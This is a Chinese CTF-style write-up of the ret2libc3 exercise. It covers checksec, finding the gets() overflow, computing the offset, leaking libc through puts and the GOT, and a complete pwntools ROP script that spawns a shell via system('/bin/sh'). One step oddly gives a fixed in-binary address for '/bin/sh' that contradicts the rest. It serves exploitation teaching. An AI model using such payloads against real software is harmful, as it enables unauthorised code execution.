## ret2libc3复现与分析

### 技术点

- checksec检查可执行文件与内核安全属性
- 使用反汇编工具（IDA pro）查找缓冲区溢出入口和可利用的源码片段
- 使用二进制调试工具（gdb）查看寄存器与内存内容
- 泄露共享库基地址
- 通过 got 表泄露共享库中函数的偏移地址
- 利用gadgets构造栈帧，通过ROP调用系统调用
- 计算需要覆写的返回地址的偏移
- payload构造

### 分析

首先通过checksec检查可执行文件的保护机制

![image-20230424205804407](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304242058445.png)

能够得知以下信息：

- 可执行文件为是一个32位的英特尔x86可执行文件，使用小端序编码。
- 开启了“部分Relocation Read-Only”技术。
- 没有开启“堆栈金丝雀（stack canary）”技术。
- 开启了“No-eXecute”保护技术。
- 没有开启“独立位置可执行（Position Independent Executable）”技术。

接下来通过IDA pro查看反汇编反编译源码：

![image-20230424210152398](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304242101422.png)

可以看主函数中明显的缓冲区溢出漏洞入口`get(s)`，因此查找是否有可以利用的工具函数与字符串。但是没有在程序中查找到`/bin/sh`字符串或`system()`函数等易于利用的工具。根据本题要求，尝试利用外部的libc中比较齐全的代码。

想要利用作为外部共享库的libc，首先要考虑的就是其基地址，只有先泄露出动态链接库的基地址才能通过固定的偏移量调用库函数。仔细调查反汇编出的源码，发现在`main()`函数中调用了`puts()`函数，想到可以使用`puts()`函数泄露出libc基地址。

因此构思获得libc基地址的攻击流程如下：

1. 通过`gets()`构造缓冲区溢出攻击，劫持控制流。
2. 覆盖`main()`函数的返回地址为`puts()`函数的地址
3. 后续填入`main()`函数地址作为`puts()`函数的返回地址，以便`puts()`函数结束后重新运行`main()`函数
4. 后续填入got表中的`__libc_start_main`函数指针地址，以通过puts将动态运行时真实的`__libc_start_main`函数地址打印出来
5. 当`main()`函数执行完毕退出时，eip指针返回到`puts()`函数的地址并打印出`__libc_start_main`函数地址打。
6. 当`puts()`函数执行完毕，eip指针返回到`main()`函数的地址重新开始执行

接着需要通过`__libc_start_main`函数地址计算出libc基地址，从而获得`system`函数和"\bin\sh"字符串的地址。因此构思获得shell的攻击流程如下：

1. 接收上轮输出的`__libc_start_main`函数
2. 通过LibcSearcher工具计算出libc基地址以及进一步获得`system`函数和"\bin\sh"字符串的地址
3. 通过`gets()`构造缓冲区溢出攻击，劫持控制流。
4. 覆盖`main()`函数的返回地址为`system`函数的地址
5. 在后续填入一个32位的虚假返回地址
6. 在后续填入字符串`/bin/sh`的地址`0x08048720`
7. 当`main()`函数执行完毕退出时，eip指针返回到`system`函数的地址并读入后续的虚假返回地址和字符串参数，并最终启动一个子进程弹出shell供攻击者使用

### 攻击复现

接下来实现攻击，同上面题目，要先确定`main()`函数返回地址。

![image-20230424222544892](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304242225941.png)

![image-20230424222643207](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304242226263.png)

使用与上一题一样的步骤，在`call _gets`的地址`0x0804868A`处下断点，可以看到：栈指针寄存器esp此时的地址为`0xffffced0`，其存放的内容即字符串`s`的地址为`0xffffceec`；基址指针寄存器ebp的地址为`0xffffcf58`。通过计算可得，s 相对于 ebp 的偏移为 `0xffffcf58-0xffffceec=0x6c`。此时内存结构如下图所示：

![image-20230424105446557](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304242227356.png)

根据上述思路编写第一轮运行的payload，构造内存结果如下：

![image-20230424223159342](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304242231377.png)

接下来因为程序重新从main开始运行，因此继续需要继续构造第二轮运行的payload，需构造内存结果如下：

![image-20230424223330737](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304242233774.png)

最后的payload如下：

```python
from pwn import *
from LibcSearcher import LibcSearcher

elf_ret2libc3 = ELF('./ret2libc3')

sh = process('./ret2libc3')

plt_puts = elf_ret2libc3.plt['puts']
got_libc_start_main = elf_ret2libc3.got['__libc_start_main']
addr_main = elf_ret2libc3.symbols['main']
offset = 0x6c + 4

payload = flat([b'a' * offset, plt_puts, addr_main, got_libc_start_main])
sh.sendlineafter('Can you find it !?', payload)
libc_start_main_addr = u32(sh.recv(4))

print('libc_start_main_addr: ' + hex(libc_start_main_addr))

libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')

print("get shell")
payload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr])
sh.sendline(payload)

sh.interactive()
```

运行payload脚本，可以成功得到shell。

![image-20230424223451333](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304242234368.png)